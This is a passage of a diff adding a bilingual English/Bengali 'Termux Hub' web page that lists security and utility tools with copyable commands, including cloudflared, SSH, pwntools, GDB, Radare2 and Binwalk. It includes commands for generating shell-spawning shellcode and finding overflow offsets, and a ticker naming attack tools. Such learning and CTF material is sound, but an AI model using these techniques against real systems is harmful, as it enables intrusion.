+            <span class="feat en">No Account Needed</span><span class="feat bn">অ্যাকাউন্ট লাগে না</span>
+            <span class="feat en">SSH/RDP Proxy</span><span class="feat bn">SSH/RDP প্রক্সি</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared && chmod +x cloudflared</code>
+          <button class="cpbtn" onclick="cp(this,'wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared && chmod +x cloudflared')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">./cloudflared</span> tunnel <span class="cf">--url</span> http://localhost:8080</div>
+            <div class="cmd-note en">Instantly create free public HTTPS tunnel (no login!)</div>
+            <div class="cmd-note bn">তাৎক্ষণিকভাবে ফ্রি পাবলিক HTTPS টানেল তৈরি করুন!</div>
+          </div><button class="cpbtn" onclick="cp(this,'./cloudflared tunnel --url http://localhost:8080')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- SSH -->
+      <div class="card" data-cat="util" data-kw="ssh openssh remote login server key keygen">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a10;border:1px solid var(--green);">🔑</div>
+          <div class="tool-meta">
+            <div class="tool-name">SSH / OpenSSH</div>
+            <div class="tool-desc en">Secure encrypted remote login, tunneling & file transfer</div>
+            <div class="tool-desc bn">এনক্রিপ্টেড রিমোট লগিন, টানেলিং ও ফাইল ট্রান্সফার</div>
+          </div>
+          <span class="badge b-util">UTILITY</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with SSH</div>
+          <div class="feat-title bn">✦ SSH দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Remote Server Login</span><span class="feat bn">রিমোট সার্ভার লগিন</span>
+            <span class="feat en">Port Forwarding</span><span class="feat bn">পোর্ট ফরওয়ার্ডিং</span>
+            <span class="feat en">SCP File Transfer</span><span class="feat bn">SCP ফাইল ট্রান্সফার</span>
+            <span class="feat en">Termux SSH Server</span><span class="feat bn">Termux SSH সার্ভার</span>
+            <span class="feat en">Key-based Auth</span><span class="feat bn">কী-ভিত্তিক অথেন্টিকেশন</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">openssh</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install openssh')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">ssh</span> <span class="ca">user@192.168.1.1</span></div>
+            <div class="cmd-note en">Connect to remote server via SSH</div>
+            <div class="cmd-note bn">SSH দিয়ে রিমোট সার্ভারে কানেক্ট করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'ssh user@192.168.1.1')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">sshd</span></div>
+            <div class="cmd-note en">Start SSH server in Termux on port 8022</div>
+            <div class="cmd-note bn">Termux-এ SSH সার্ভার চালু করুন (পোর্ট ৮০২২)</div>
+          </div><button class="cpbtn" onclick="cp(this,'sshd')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">ssh-keygen</span> <span class="cf">-t rsa -b 4096</span></div>
+            <div class="cmd-note en">Generate RSA key pair for passwordless login</div>
+            <div class="cmd-note bn">পাসওয়ার্ডলেস লগিনের জন্য RSA কী পেয়ার তৈরি করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'ssh-keygen -t rsa -b 4096')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">scp</span> file.txt <span class="ca">user@server:/path/</span></div>
+            <div class="cmd-note en">Securely copy file to remote server</div>
+            <div class="cmd-note bn">রিমোট সার্ভারে নিরাপদে ফাইল কপি করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'scp file.txt user@server:/path/')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- GIT -->
+      <div class="card" data-cat="util" data-kw="git clone github repository version control push pull">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a10;border:1px solid var(--green);">📦</div>
+          <div class="tool-meta">
+            <div class="tool-name">Git</div>
+            <div class="tool-desc en">Clone GitHub repos, manage code & track changes</div>
+            <div class="tool-desc bn">GitHub রিপো ক্লোন করুন, কোড ম্যানেজ করুন ও পরিবর্তন ট্র্যাক করুন</div>
+          </div>
+          <span class="badge b-util">UTILITY</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Git</div>
+          <div class="feat-title bn">✦ Git দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Clone Any Repo</span><span class="feat bn">যেকোনো রিপো ক্লোন</span>
+            <span class="feat en">Push/Pull Code</span><span class="feat bn">কোড Push/Pull</span>
+            <span class="feat en">Branch Management</span><span class="feat bn">ব্রাঞ্চ ম্যানেজমেন্ট</span>
+            <span class="feat en">Commit History</span><span class="feat bn">কমিট ইতিহাস</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">git</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install git')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">git</span> clone <span class="ca">https://github.com/user/repo</span></div>
+            <div class="cmd-note en">Clone any GitHub/GitLab repository</div>
+            <div class="cmd-note bn">যেকোনো GitHub/GitLab রিপো ক্লোন করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'git clone https://github.com/user/repo')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">git</span> pull && <span class="cb">git</span> log <span class="cf">--oneline -10</span></div>
+            <div class="cmd-note en">Update repo and view last 10 commits</div>
+            <div class="cmd-note bn">রিপো আপডেট করুন ও শেষ ১০টি কমিট দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'git pull && git log --oneline -10')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- PYTHON / PHP / NODEJS -->
+      <div class="card" data-cat="util" data-kw="python php nodejs javascript scripting server automation">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#001a10;border:1px solid var(--green);">🐍</div>
+          <div class="tool-meta">
+            <div class="tool-name">Python3 / PHP / NodeJS</div>
+            <div class="tool-desc en">Scripting languages for automation, tools & web servers</div>
+            <div class="tool-desc bn">অটোমেশন, টুলস ও ওয়েব সার্ভারের জন্য স্ক্রিপ্টিং ভাষা</div>
+          </div>
+          <span class="badge b-util">SCRIPTING</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do</div>
+          <div class="feat-title bn">✦ যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Run Any Script</span><span class="feat bn">যেকোনো স্ক্রিপ্ট চালান</span>
+            <span class="feat en">Quick HTTP Server</span><span class="feat bn">দ্রুত HTTP সার্ভার</span>
+            <span class="feat en">Install Libraries</span><span class="feat bn">লাইব্রেরি ইন্সটল</span>
+            <span class="feat en">Build Custom Tools</span><span class="feat bn">কাস্টম টুলস তৈরি</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">python php nodejs</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install python php nodejs')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">PYTHON3</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> <span class="ca">script.py</span></div>
+            <div class="cmd-note en">Run any Python script</div>
+            <div class="cmd-note bn">যেকোনো Python স্ক্রিপ্ট চালান</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 script.py')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">python3</span> <span class="cf">-m</span> http.server <span class="ca">8080</span></div>
+            <div class="cmd-note en">Quick HTTP file server on port 8080</div>
+            <div class="cmd-note bn">পোর্ট 8080-এ দ্রুত HTTP ফাইল সার্ভার</div>
+          </div><button class="cpbtn" onclick="cp(this,'python3 -m http.server 8080')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">pip</span> install <span class="ca">requests beautifulsoup4</span></div>
+            <div class="cmd-note en">Install Python libraries via pip</div>
+            <div class="cmd-note bn">pip দিয়ে Python লাইব্রেরি ইন্সটল করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'pip install requests beautifulsoup4')">COPY</button></div>
+          <div class="cmd-lbl">PHP & NODE</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">php</span> <span class="cf">-S</span> <span class="ca">0.0.0.0:8080</span></div>
+            <div class="cmd-note en">Start PHP development web server</div>
+            <div class="cmd-note bn">PHP ডেভেলপমেন্ট ওয়েব সার্ভার চালু করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'php -S 0.0.0.0:8080')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">node</span> <span class="ca">app.js</span> && <span class="cb">npm</span> install <span class="ca">express</span></div>
+            <div class="cmd-note en">Run Node app and install npm packages</div>
+            <div class="cmd-note bn">Node অ্যাপ চালান ও npm প্যাকেজ ইন্সটল করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'node app.js')">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════════
+       9. CTF / PRACTICE
+  ════════════════════════════════════════ -->
+  <div class="sec" data-section="ctf">
+    <div class="sec-head">
+      <div class="sec-icon">🏁</div>
+      <div>
+        <div class="sec-title en">CTF / Practice Tools</div>
+        <div class="sec-title bn">CTF / প্র্যাকটিস টুলস</div>
+        <div class="sec-sub en">Binary exploitation, debugging & reverse engineering for learning</div>
+        <div class="sec-sub bn">শেখার জন্য বাইনারি এক্সপ্লয়েটেশন, ডিবাগিং ও রিভার্স ইঞ্জিনিয়ারিং</div>
+      </div>
+      <div class="sec-count">4 TOOLS</div>
+    </div>
+    <div class="grid">
+
+      <!-- PWNTOOLS -->
+      <div class="card" data-cat="ctf" data-kw="pwntools ctf exploit binary pwn shellcode rop">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0015;border:1px solid #ff88aa;">🏁</div>
+          <div class="tool-meta">
+            <div class="tool-name">pwntools</div>
+            <div class="tool-desc en">Python CTF framework for binary exploitation & pwn challenges</div>
+            <div class="tool-desc bn">বাইনারি এক্সপ্লয়েটেশন ও pwn চ্যালেঞ্জের জন্য Python CTF ফ্রেমওয়ার্ক</div>
+          </div>
+          <span class="badge b-ctf">CTF</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with pwntools</div>
+          <div class="feat-title bn">✦ pwntools দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Buffer Overflow</span><span class="feat bn">বাফার ওভারফ্লো</span>
+            <span class="feat en">ROP Chain Builder</span><span class="feat bn">ROP চেইন বিল্ডার</span>
+            <span class="feat en">Shellcode Generate</span><span class="feat bn">শেলকোড তৈরি</span>
+            <span class="feat en">Remote/Local Exploit</span><span class="feat bn">রিমোট/লোকাল এক্সপ্লয়েট</span>
+            <span class="feat en">Cyclic Pattern</span><span class="feat bn">সাইক্লিক প্যাটার্ন</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pip install pwntools</code>
+          <button class="cpbtn" onclick="cp(this,'pip install pwntools')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">cyclic</span> <span class="ca">200</span></div>
+            <div class="cmd-note en">Generate 200-byte De Bruijn pattern to find buffer overflow offset</div>
+            <div class="cmd-note bn">বাফার ওভারফ্লো অফসেট খুঁজতে ২০০ বাইট প্যাটার্ন তৈরি করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'cyclic 200')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">pwn</span> checksec <span class="ca">./binary</span></div>
+            <div class="cmd-note en">Check security protections on a binary (NX, ASLR, Canary, PIE)</div>
+            <div class="cmd-note bn">বাইনারির নিরাপত্তা প্রটেকশন চেক করুন (NX, ASLR, Canary)</div>
+          </div><button class="cpbtn" onclick="cp(this,'pwn checksec ./binary')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">pwn</span> shellcraft <span class="cf">-p</span> amd64.linux.sh</div>
+            <div class="cmd-note en">Generate shell-spawning shellcode for x64 Linux</div>
+            <div class="cmd-note bn">x64 Linux-এর জন্য শেল-স্পনিং শেলকোড তৈরি করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'pwn shellcraft -p amd64.linux.sh')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- GDB -->
+      <div class="card" data-cat="ctf" data-kw="gdb gnu debugger binary breakpoint pwndbg peda">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0015;border:1px solid #ff88aa;">🐛</div>
+          <div class="tool-meta">
+            <div class="tool-name">GDB + pwndbg</div>
+            <div class="tool-desc en">GNU Debugger — step through, inspect & analyze binaries</div>
+            <div class="tool-desc bn">GNU ডিবাগার — বাইনারি স্টেপ থ্রু, ইন্সপেক্ট ও বিশ্লেষণ করুন</div>
+          </div>
+          <span class="badge b-ctf">CTF</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with GDB</div>
+          <div class="feat-title bn">✦ GDB দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Set Breakpoints</span><span class="feat bn">ব্রেকপয়েন্ট সেট</span>
+            <span class="feat en">Stack Inspection</span><span class="feat bn">স্ট্যাক ইন্সপেকশন</span>
+            <span class="feat en">Register View</span><span class="feat bn">রেজিস্টার দেখুন</span>
+            <span class="feat en">Disassemble Code</span><span class="feat bn">কোড ডিসঅ্যাসেম্বল</span>
+            <span class="feat en">Memory Examine</span><span class="feat bn">মেমরি পরীক্ষা</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pkg install gdb && git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh</code>
+          <button class="cpbtn" onclick="cp(this,'pkg install gdb && git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">gdb</span> <span class="ca">./binary</span></div>
+            <div class="cmd-note en">Open binary file in GDB debugger</div>
+            <div class="cmd-note bn">GDB ডিবাগারে বাইনারি ফাইল খুলুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'gdb ./binary')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">gdb&gt; <span class="cb">break main</span></div>
+            <div class="cmd-note en">Set breakpoint at main() function</div>
+            <div class="cmd-note bn">main() ফাংশনে ব্রেকপয়েন্ট সেট করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'break main')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">gdb&gt; <span class="cb">run</span> && <span class="cb">next</span> && <span class="cb">info registers</span></div>
+            <div class="cmd-note en">Run, step to next line, view register values</div>
+            <div class="cmd-note bn">রান করুন, পরের লাইনে যান, রেজিস্টার ভ্যালু দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'run')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">gdb&gt; <span class="cb">disassemble main</span></div>
+            <div class="cmd-note en">View assembly code of the main function</div>
+            <div class="cmd-note bn">main ফাংশনের অ্যাসেম্বলি কোড দেখুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'disassemble main')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- RADARE2 -->
+      <div class="card" data-cat="ctf" data-kw="radare2 r2 reverse engineering disassembly hex binary analysis">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0015;border:1px solid #ff88aa;">⚙️</div>
+          <div class="tool-meta">
+            <div class="tool-name">Radare2</div>
+            <div class="tool-desc en">Advanced binary analysis & reverse engineering framework</div>
+            <div class="tool-desc bn">এডভান্সড বাইনারি বিশ্লেষণ ও রিভার্স ইঞ্জিনিয়ারিং ফ্রেমওয়ার্ক</div>
+          </div>
+          <span class="badge b-ctf">CTF</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Radare2</div>
+          <div class="feat-title bn">✦ Radare2 দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Disassembly</span><span class="feat bn">ডিসঅ্যাসেম্বলি</span>
+            <span class="feat en">Hex Editor</span><span class="feat bn">হেক্স এডিটর</span>
+            <span class="feat en">String Search</span><span class="feat bn">স্ট্রিং সার্চ</span>
+            <span class="feat en">Binary Patch</span><span class="feat bn">বাইনারি প্যাচ</span>
+            <span class="feat en">Debugger Built-in</span><span class="feat bn">বিল্ট-ইন ডিবাগার</span>
+            <span class="feat en">Graph View</span><span class="feat bn">গ্রাফ ভিউ</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code><span style="color:var(--cyan)">pkg</span> install <span style="color:var(--orange)">radare2</span></code>
+          <button class="cpbtn" onclick="cp(this,'pkg install radare2')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">r2</span> <span class="ca">./binary</span></div>
+            <div class="cmd-note en">Open binary in radare2 for analysis</div>
+            <div class="cmd-note bn">বিশ্লেষণের জন্য radare2-এ বাইনারি খুলুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'r2 ./binary')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">r2&gt; <span class="cb">aaa</span></div>
+            <div class="cmd-note en">Analyze all functions, symbols & code flow</div>
+            <div class="cmd-note bn">সব ফাংশন, সিম্বল ও কোড ফ্লো বিশ্লেষণ করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'aaa')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">r2&gt; <span class="cb">afl</span></div>
+            <div class="cmd-note en">List all detected functions with addresses</div>
+            <div class="cmd-note bn">ঠিকানাসহ সব ডিটেক্ট হওয়া ফাংশনের তালিকা</div>
+          </div><button class="cpbtn" onclick="cp(this,'afl')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">r2&gt; <span class="cb">iz</span></div>
+            <div class="cmd-note en">List all strings inside binary (find flags/passwords!)</div>
+            <div class="cmd-note bn">বাইনারির সব স্ট্রিং দেখুন (ফ্ল্যাগ/পাসওয়ার্ড খুঁজুন!)</div>
+          </div><button class="cpbtn" onclick="cp(this,'iz')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code">r2&gt; <span class="cb">pdf @</span> <span class="ca">main</span></div>
+            <div class="cmd-note en">Disassemble and print main function code</div>
+            <div class="cmd-note bn">main ফাংশন কোড ডিসঅ্যাসেম্বল ও প্রিন্ট করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'pdf @ main')">COPY</button></div>
+        </div>
+      </div>
+
+      <!-- BINWALK -->
+      <div class="card" data-cat="ctf" data-kw="binwalk firmware extraction steganography embedded files">
+        <div class="card-top">
+          <div class="tool-icon" style="background:#1a0015;border:1px solid #ff88aa;">🔬</div>
+          <div class="tool-meta">
+            <div class="tool-name">Binwalk</div>
+            <div class="tool-desc en">Firmware analysis & hidden file extraction — stego & forensics</div>
+            <div class="tool-desc bn">ফার্মওয়্যার বিশ্লেষণ ও লুকানো ফাইল এক্সট্র্যাকশন — স্টেগো ও ফরেনসিক্স</div>
+          </div>
+          <span class="badge b-ctf">CTF</span>
+        </div>
+        <div class="features">
+          <div class="feat-title en">✦ What you can do with Binwalk</div>
+          <div class="feat-title bn">✦ Binwalk দিয়ে যা করতে পারবেন</div>
+          <div class="feat-list">
+            <span class="feat en">Firmware Extract</span><span class="feat bn">ফার্মওয়্যার এক্সট্র্যাক্ট</span>
+            <span class="feat en">Hidden File Find</span><span class="feat bn">লুকানো ফাইল খোঁজা</span>
+            <span class="feat en">Steganography</span><span class="feat bn">স্টেগানোগ্রাফি</span>
+            <span class="feat en">Entropy Analysis</span><span class="feat bn">এন্ট্রপি বিশ্লেষণ</span>
+            <span class="feat en">Auto File Carving</span><span class="feat bn">অটো ফাইল কার্ভিং</span>
+          </div>
+        </div>
+        <div class="inst">
+          <code>pip install binwalk</code>
+          <button class="cpbtn" onclick="cp(this,'pip install binwalk')">COPY</button>
+        </div>
+        <div class="cmds">
+          <div class="cmd-lbl">COMMANDS</div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">binwalk</span> <span class="ca">firmware.bin</span></div>
+            <div class="cmd-note en">Scan file for embedded data, filesystems & signatures</div>
+            <div class="cmd-note bn">ফাইলে এমবেডেড ডেটা, ফাইলসিস্টেম ও সিগনেচার স্ক্যান করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'binwalk firmware.bin')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">binwalk</span> <span class="cf">-e</span> <span class="ca">firmware.bin</span></div>
+            <div class="cmd-note en">Extract all found embedded files automatically</div>
+            <div class="cmd-note bn">পাওয়া সব এমবেডেড ফাইল অটোমেটিকভাবে এক্সট্র্যাক্ট করুন</div>
+          </div><button class="cpbtn" onclick="cp(this,'binwalk -e firmware.bin')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">binwalk</span> <span class="cf">-E</span> <span class="ca">image.png</span></div>
+            <div class="cmd-note en">Entropy analysis — detect encrypted or compressed hidden data</div>
+            <div class="cmd-note bn">এন্ট্রপি বিশ্লেষণ — এনক্রিপ্টেড বা কম্প্রেসড লুকানো ডেটা ডিটেক্ট</div>
+          </div><button class="cpbtn" onclick="cp(this,'binwalk -E image.png')">COPY</button></div>
+          <div class="cmd-row"><div class="cmd-content">
+            <div class="cmd-code"><span class="cb">binwalk</span> <span class="cf">--dd</span> <span class="cs">'.*'</span> <span class="ca">image.jpg</span></div>
+            <div class="cmd-note en">Extract ALL file types from image (CTF steganography)</div>
+            <div class="cmd-note bn">ইমেজ থেকে সব ফাইল টাইপ এক্সট্র্যাক্ট করুন (CTF স্টেগানোগ্রাফি)</div>
+          </div><button class="cpbtn" onclick="cp(this,\"binwalk --dd '.*' image.jpg\")">COPY</button></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="no-res" id="nores">
+    <p style="font-size:30px;margin-bottom:12px;">🔍</p>
+    <p class="en">No tools found. Try a different search term.</p>
+    <p class="bn">কোনো টুল পাওয়া যায়নি। ভিন্ন শব্দ দিয়ে খুঁজুন।</p>
+  </div>
+</div>
+
+<footer>
+  <div style="margin-bottom:16px;">
+    <div style="display:inline-flex;align-items:center;gap:14px;background:var(--panel);border:1px solid var(--border2);border-radius:12px;padding:14px 28px;">
+      <div style="width:42px;height:42px;background:var(--green4);border:2px solid var(--green);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 0 16px rgba(0,255,65,0.4);">👨‍💻</div>
+      <div style="text-align:left;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:3px;margin-bottom:3px;">DEVELOPED BY</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:18px;color:var(--green);font-weight:700;letter-spacing:2px;text-shadow:0 0 12px rgba(0,255,65,0.5);">Zayn Khan NaYem</div>
+      </div>
+    </div>
+  </div>
+  <p><em>Termux Hub</em> — <span class="en">For ethical hackers, CTF players & learners • Educational use only</span><span class="bn">ইথিক্যাল হ্যাকার, CTF প্লেয়ার ও শিক্ষার্থীদের জন্য • শুধুমাত্র শিক্ষামূলক</span> — <em>2025</em></p>
+</footer>
+
+<div class="notif" id="notif">✓ Copied!</div>
+
+<script>
+// MATRIX
+const mc=document.getElementById('mc');const ctx=mc.getContext('2d');
+function rsz(){mc.width=window.innerWidth;mc.height=window.innerHeight;}rsz();window.addEventListener('resize',rsz);
+const ch='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@!<>{}[]01';const fs=13;
+let cols=Math.floor(mc.width/fs);let drops=Array(cols).fill(1);
+setInterval(()=>{
+  ctx.fillStyle='rgba(7,11,7,0.04)';ctx.fillRect(0,0,mc.width,mc.height);
+  ctx.fillStyle='#00ff41';ctx.font=fs+'px Share Tech Mono,monospace';
+  drops.forEach((y,i)=>{
+    ctx.fillText(ch[Math.floor(Math.random()*ch.length)],i*fs,y*fs);
+    if(y*fs>mc.height&&Math.random()>.975)drops[i]=0;drops[i]++;
+  });
+},55);
+
+// TICKER
+const tools=[
+  ['📡','Nmap'],['🔍','Whois'],['🌾','theHarvester'],['🕸️','Recon-ng'],['🔎','Sherlock'],['📞','PhoneInfoga'],
+  ['🦈','Wireshark'],['📦','Tcpdump'],['🎯','Bettercap'],['📶','Aircrack-ng'],['🛰️','Kismet'],
+  ['🗄️','SQLMap'],['🔍','Nikto'],['🕷️','Wapiti'],['⚡','XSStrike'],['🦊','Burp Suite'],
+  ['🔐','Hydra'],['💀','John The Ripper'],['🔥','Hashcat'],['📝','Crunch'],
+  ['🛡️','Metasploit'],['📡','RouterSploit'],['💥','Commix'],
+  ['🕵️','Maigret'],['📧','Holehe'],['🔬','Social-Analyzer'],
+  ['🔧','Apktool'],['🔬','MobSF'],['🤖','ADB'],
+  ['🌍','Ngrok'],['☁️','Cloudflared'],['🔑','SSH'],['📦','Git'],['🐍','Python/PHP/Node'],
+  ['🏁','pwntools'],['🐛','GDB'],['⚙️','Radare2'],['🔬','Binwalk']
+];
+const tk=document.getElementById('ticker-inner');
+let h='';for(let i=0;i<2;i++)tools.forEach(([e,n])=>{h+=`<span>${e} ${n}</span>`;});
+tk.innerHTML=h;
+
+// LANG
+let lang='en';
+function setL(l){
+  lang=l;document.body.className=l;
+  document.getElementById('lben').className='lbtn'+(l==='en'?' on':'');
+  document.getElementById('lbbn').className='lbtn'+(l==='bn'?' on':'');
+  document.getElementById('srch').placeholder=l==='en'?'Search tools & commands...':'টুলস ও কমান্ড খুঁজুন...';
+}
+
+// COPY
+function cp(btn,text){
+  const act=()=>{
+    btn.textContent='✓';btn.classList.add('ok');
+    const n=document.getElementById('notif');n.textContent=lang==='en'?'✓ Copied!':'✓ কপি হয়েছে!';
+    n.classList.add('show');
+    setTimeout(()=>n.classList.remove('show'),2000);
+    setTimeout(()=>{btn.textContent='COPY';btn.classList.remove('ok');},1500);
+  };
+  navigator.clipboard?.writeText(text).then(act).catch(()=>{
+    const ta=document.createElement('textarea');ta.value=text;
+    document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);act();
+  });
+}
+
+
+  // ── IP LOOKUP ──
+  let ipResultData = {};
+  async function lookupIP() {
+    const inp = document.getElementById('ip-input').value.trim();
+    await fetchIPData(inp);
+  }
+  async function lookupMyIP() {
+    document.getElementById('ip-input').value = '';
+    await fetchIPData('');
+  }
+  async function fetchIPData(ip) {
+    const res  = document.getElementById('ip-result');
+    const load = document.getElementById('ip-loading');
+    const data = document.getElementById('ip-data');
+    const err  = document.getElementById('ip-error');
+    res.style.display='block'; load.style.display='block'; data.style.display='none'; err.style.display='none';
+    try {
+      // Use ip-api.com — free, no key needed, CORS friendly
+      // Use multiple APIs as fallback
+      let d = null;
+      // Try 1: ipapi.co (HTTPS, free, no key)
+      try {
+        const url1 = ip ? `https://ipapi.co/${ip}/json/` : `https://ipapi.co/json/`;
+        const r1 = await fetch(url1, {headers:{'Accept':'application/json'}});
+        const j1 = await r1.json();
+        if (!j1.error && j1.ip) {
+          d = {
+            query: j1.ip, country: j1.country_name, countryCode: j1.country_code,
+            regionName: j1.region, city: j1.city, zip: j1.postal,
+            lat: j1.latitude, lon: j1.longitude, timezone: j1.timezone,
+            org: j1.org, isp: j1.org, status: 'success'
+          };
+        }
+      } catch(e1) {}
+      // Try 2: freeipapi.com (HTTPS, free)
+      if (!d) {
+        try {
+          const url2 = ip ? `https://freeipapi.com/api/json/${ip}` : `https://freeipapi.com/api/json`;
+          const r2 = await fetch(url2);
+          const j2 = await r2.json();
+          if (j2.ipAddress) {
+            d = {
+              query: j2.ipAddress, country: j2.countryName, countryCode: j2.countryCode,
+              regionName: j2.regionName, city: j2.cityName, zip: j2.zipCode,
+              lat: j2.latitude, lon: j2.longitude, timezone: j2.timeZone,
+              org: j2.isProxy ? 'Proxy' : 'N/A', isp: 'N/A', status: 'success'
+            };
+          }
+        } catch(e2) {}
+      }
+      if (!d || d.status === 'fail') throw new Error('Could not fetch IP info. Try again.');
+      ipResultData = d;
+      const cc = (d.countryCode || '').toUpperCase();
+      const flagEmoji = cc ? String.fromCodePoint(...[...cc].map(c=>c.charCodeAt(0)+127397)) : '🌐';
+      document.getElementById('ip-flag').textContent = flagEmoji;
+      document.getElementById('ip-address-show').textContent = d.query || 'N/A';
